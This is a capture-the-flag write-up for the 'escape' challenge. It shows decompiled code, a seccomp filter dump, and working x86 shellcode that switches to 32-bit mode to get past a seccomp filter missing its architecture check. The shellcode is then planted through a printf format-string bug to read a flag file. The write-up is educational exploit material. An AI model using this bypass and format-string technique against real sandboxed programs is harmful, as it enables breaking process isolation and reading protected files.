escape Writeup
===

## Target

`escape` is an exploitation challenge which requires to exploit 2 bugs: 
1. Format string vulnerability by using user-provided string as an format argument to write 
a shellcode into a buffer.
2. Linux SECCOMP vulnerability in missing i386 arch check to bypass syscall restrictions.

These bugs can be identified through reverse engineering of `escape` binary provided to
participants.

## Source code description

There are 3 logical parts in binary.

In the first part binary setups SECCOMP environment which creates sandbox.

```c
static inline int setup_seccomp(void)
{
    // must set to PR_SET_NO_NEW_PRIVS to 1, otherwise SECCOMP_MODE_FILTER will fail.
    // https://man7.org/linux/man-pages/man2/seccomp.2.html
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1)
        return 0;

    // BPF filter program
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))), // get syscall number
        BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, __X32_SYSCALL_BIT, 11, 0), // prevent user from calling x32 ABI
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 10, 0),       // if (syscall == open()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, 9, 0),      // if (syscall == open()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, 8, 0),        // if (syscall == open()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_open, 7, 0),          // if (syscall == open()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_chmod, 6, 0),         // if (syscall == chmod()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_fchmod, 5, 0),        // if (syscall == fchmod()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_chown, 4, 0),         // if (syscall == chown()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_fchown, 3, 0),        // if (syscall == fchown()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_lchown, 2, 0),        // if (syscall == lchown()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_chdir, 1, 0),         // if (syscall == chdir()) kill else allow
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_fchdir, 0, 2),        // if (syscall == fchdir()) kill else allow

        // issue is here: we still do not check the use of x32 API, thus it can be called from the assembly
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),  // return kill
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRACE), // return trace
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW), // return allow
    };

    struct sock_fprog bpf_prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };

    // enable SECCOMP filter mode
    return prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &bpf_prog) == -1 ? 0 : 1;
}
```

Line `0001` disallows usage of x32 ABI calls (checks if syscall number larger than `0x40000000`)
and other lines list prohibited syscalls with x86-64 ABI like `execve()`, `open()`, etc.
The part of the challenge is to bypass SECCOMP. 

In the second part binary allocates RWX page at a fixed address `0x5051000` to execute shellcode.
Fixed address is used to make shellcode accessible in 32-bit environment.

```c
    #define JIT_ADDR 0x50510000
    /* ... */
    addr = mmap(JIT_ADDR, page_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
```

RWX page filled with NOPs (`0x90` opcode) and ends with RET (`0xC3` opcode).

In the third part binary loops with `printf` call. This allows an attacker to place a shellcode 
into allocated RWX page. 

```c
    char buffer[128];
    while (1)
    {
        printf("Enter: \n");
        fflush(stdout);

        if (fgets(buffer, sizeof(buffer), stdin) != buffer)
            return -2;
        // exit prompt
        if (!strncmp(buffer, "done", 4))
            break;
        //
        printf("Entered: ");
        printf(buffer);
        fflush(stdout);
    }
```

Once `done` string received loop is over and execution transferred to RWX page with shellcode.

## Analysis

Initial analysis of binary with `checksec` shows that binary have all mitigations enabled:

```sh
$ checksec escape
[*] '/challenge/escape2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Lets start reversing then to find out what program do. The program doesn't have any obfuscation and
code size rather small.

```c
void main(int param_1)

{
  int iVar1;
  long lVar2;
  char *pcVar3;
  char *__s;
  long in_FS_OFFSET;
  code *sc;
  size_t sc_size;
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = FUN_00101289();  // setup seccomp
  if (iVar1 == 0) {
                    /* WARNING: Subroutine does not return */
    exit(param_1);
  }
  lVar2 = FUN_00101492(&sc,&sc_size); // allocate shellcode page
  if (lVar2 != 0) {
    memset(sc,0x90,sc_size);
    sc[sc_size - 1] = (code)0xc3;
    puts("Checking \'printf\' loop");
    while( true ) {
      puts("Enter: ");
      fflush(stdout);
      __s = local_98;
      pcVar3 = fgets(__s,0x80,stdin);
      if (pcVar3 != local_98) {
                    /* WARNING: Subroutine does not return */
        exit((int)__s);
      }
      iVar1 = strncmp(local_98,"done",4);
      if (iVar1 == 0) break;
      printf("Entered: ");
      printf(local_98); // bad printf
      fflush(stdout);
    }
    puts("Checking JIT page");
    (*sc)(); // execute shellcode
    munmap(sc,sc_size);
                    /* WARNING: Subroutine does not return */
    exit((int)sc);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Lets look inside a first call. The function is `FUN_00101289`. Small analysis and we see that 
SECCOMP is used here to create sandbox and restrict calling some syscalls.

```c

bool FUN_00101289(void)

{
  long lVar1;
  int iVar2;
  long in_FS_OFFSET;
  bool bVar3;
  sock_fprog bpf;
  sock_filter filter [16];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  iVar2 = prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); // no new privs
  if (iVar2 == -1) {
    bVar3 = false;
  }
  else {
    filter[0].code = 0x20;
    filter[0].jt = '\0';
    filter[0].jf = '\0';
    filter[0].k = 0;
    filter[1].code = 0x35;
    filter[1].jt = '\v';
    filter[1].jf = '\0';
    filter[1].k = 0x40000000;
    filter[2].code = 0x15;
    filter[2].jt = '\n';
    filter[2].jf = '\0';
    filter[2].k = 0x3b;
    filter[3].code = 0x15;
    filter[3].jt = '\t';
    filter[3].jf = '\0';
    filter[3].k = 0x142;
    filter[4].code = 0x15;
    filter[4].jt = '\b';
    filter[4].jf = '\0';
    filter[4].k = 0x101;
    filter[5].code = 0x15;
    filter[5].jt = '\a';
    filter[5].jf = '\0';
    filter[5].k = 2;
    filter[6].code = 0x15;
    filter[6].jt = '\x06';
    filter[6].jf = '\0';
    filter[6].k = 0x5a;
    filter[7].code = 0x15;
    filter[7].jt = '\x05';
    filter[7].jf = '\0';
    filter[7].k = 0x5b;
    filter[8].code = 0x15;
    filter[8].jt = '\x04';
    filter[8].jf = '\0';
    filter[8].k = 0x5c;
    filter[9].code = 0x15;
    filter[9].jt = '\x03';
    filter[9].jf = '\0';
    filter[9].k = 0x5d;
    filter[10].code = 0x15;
    filter[10].jt = '\x02';
    filter[10].jf = '\0';
    filter[10].k = 0x5e;
    filter[11].code = 0x15;
    filter[11].jt = '\x01';
    filter[11].jf = '\0';
    filter[11].k = 0x50;
    filter[12].code = 0x15;
    filter[12].jt = '\0';
    filter[12].jf = '\x02';
    filter[12].k = 0x51;
    filter[13].code = 6;
    filter[13].jt = '\0';
    filter[13].jf = '\0';
    filter[13].k = 0;
    filter[14].code = 6;
    filter[14].jt = '\0';
    filter[14].jf = '\0';
    filter[14].k = 0x7ff00000;
    filter[15].code = 6;
    filter[15].jt = '\0';
    filter[15].jf = '\0';
    filter[15].k = 0x7fff0000;
    bpf.len = 16;
    unique0x00003200 = filter;
    iVar2 = prctl(PR_SET_SECCOMP,2,&bpf); // seccomp
    bVar3 = iVar2 != -1;
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                      /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return bVar3;
}
```

Ghidra 10.1 seems doesn't include BPF definition and we will require to reconstruct filter manually.
Alternatively and much faster SECCOMP rules could be retrieved by using `seccomp-tools`
conveniently without binary reversing:

```sh
$ seccomp-tools dump ./escape
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x0b 0x00 0x40000000  if (A >= 0x40000000) goto 0013
 0002: 0x15 0x0a 0x00 0x0000003b  if (A == execve) goto 0013
 0003: 0x15 0x09 0x00 0x00000142  if (A == execveat) goto 0013
 0004: 0x15 0x08 0x00 0x00000101  if (A == openat) goto 0013
 0005: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0013
 0006: 0x15 0x06 0x00 0x0000005a  if (A == chmod) goto 0013
 0007: 0x15 0x05 0x00 0x0000005b  if (A == fchmod) goto 0013
 0008: 0x15 0x04 0x00 0x0000005c  if (A == chown) goto 0013
 0009: 0x15 0x03 0x00 0x0000005d  if (A == fchown) goto 0013
 0010: 0x15 0x02 0x00 0x0000005e  if (A == lchown) goto 0013
 0011: 0x15 0x01 0x00 0x00000050  if (A == chdir) goto 0013
 0012: 0x15 0x00 0x02 0x00000051  if (A != fchdir) goto 0015
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x06 0x00 0x00 0x7ff00000  return TRACE
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

The most important here is `open` syscall because we will be unable to open file `flag`. Also
here we can spot bug that architecture validation is missing. This how missing BPF filter statements
should look like:

```c
	BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),
	BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
	BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)
```

Thus SECCOMP bypass is found. Next we need to find a way to execute our shellcode. Reversing
shows that there is an insecure loop with our string supplied as an `printf` format argument:

```c
    while( true ) {
      __s = local_98;
      pcVar3 = fgets(__s,0x80,stdin); // read string from user
      if (pcVar3 != local_98) {
        exit((int)__s);
      }
      iVar1 = strncmp(local_98,"done",4); // exit on 'done'
      if (iVar1 == 0) break;
      printf(local_98); // printf with read string
    }
```

Looks like the second bug is found which allows us to read/write anything from memory. The last
what we need is to find what we can overwrite to execute our code. As we saw the binary
has mitigations NX enabled but lets look into the second fuction called inside `main`:

```c
void * FUN_00101492(void **param_1,size_t *param_2)

{
  size_t __len;
  void *pvVar1;
  
  __len = sysconf(0x1e);
  pvVar1 = mmap((void *)0x50510000,__len,7,0x32,-1,0); // prot = 7 (RWX)
  if (pvVar1 == (void *)0xffffffffffffffff) {
    pvVar1 = (void *)0x0;
  }
  else {
    *param_1 = pvVar1;
    *param_2 = __len;
  }
  return pvVar1;
}
```

```c
  lVar2 = FUN_00101492(&sc,&sc_size); // allocate page
  ...
    memset(sc,0x90,sc_size); // fill with 0x90 (nop)
    sc[sc_size - 1] = (code)0xc3; // set the last element 0xc3 (ret)
    ...
    (*sc)();
```

And the place to store shellcode is found. This is a specially created RWX page which we can
write and then execute. This page is filled with NOPs and it means we put shellcode at any offset.
NOPs guarantee that our shellcode will be executed.

## Exploitation

So the exploitation will consists of 2 parts:
1. Create an shellcode to bypass SECCOMP rules.
2. Upload the shellcode to RWX page using vulnerable `printf` calls.

The first step is to craft shellcode with switching to i386 mode through jump to an desired address 
with special segment selector (just xor call address with `0x2300000000`) and then ordinary x86 
ABI syscalls can be used to read `flag` file.

Here is how switch to x86 mode looks like:

```c
    call $+5
    pop rax  /* get rip */
    add rax, 0x14 /* offset from $ to .i386_shellcode */
    mov rsi, 0x2300000000
    xor rax, rsi
    push rax
    retfd
```

Next we can use ordinary i386 shellcode to read `flag` file from current directory. But before
using it we need switch to a new stack. It is because our shellcode requires stack to be present
but previous stack pointer refers to 64 bit address which is not accessible from x86 mode.

```c
.i386_shellcode:
    /* pivot stack */
    mov esp, {hex(stack_addr)}
    /* open */
    mov eax, 0x5 /* syscall */
    push 0 /** '\x00\x00\x00\x00' **/
    push 0x67616c66 /** 'flag' **/
    mov ebx, esp /* filename */
    xor ecx, ecx /* mode */
    xor edx, edx /* flags */
    int 0x80
    /* read */
    mov ebx, eax /* fd */
    mov eax, 3 /* syscall */
    sub esp, 0x40
    mov ecx, esp /* buffer */
    mov edx, 0x40 /* count */
    int 0x80
    /* write */
    mov eax, 4 /* syscall */
    mov ebx, 1 /* fd */
    int 0x80
```

At this step our shellcode is ready.

The second step with uploading already compiled shellcode using `printf` loop is straightforward:
find a format string offset and using this offset create series of format string arguments to write 
shellcode to a predefined address. This is done by using `%n` format modifier which writes a number
of characters written to output so far. The limitation here is to not use `\n` character in
payload because it is used as a string terminator. In our case it was enough to shift a bit from
RWX page start (0x20 offset).

All exploitation steps can be automatized using `pwntools` framework. It provides convenient
interface to interact with a remote (`remote`), automatically generate format string
payload (`fmtstr_payload` and `FmtStr`) to write arbitrary data and shellcode generation
from assembly listings (`shellcraft` and `asm`).

Running exploit gives flag:

```
$ python3 exploit.py
[+] Opening connection to 127.0.0.1 on port 5051: Done
[*] Found format string offset: 8
[*] Transfering shellcode
[+] Flag: SCTF{4lm057_f0r607_4b0u7_7h1r7y_7w0_b175}
[*] Closed connection to 127.0.0.1 port 5051
```

## References

Writeups to similar tasks:
- https://www.aynakeya.com/2022/11/08/ctf/a-brief-introduction-to-seccomp-and-how-to-bypass/
- https://giles-one.github.io/2021/07/09/%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-shellcode/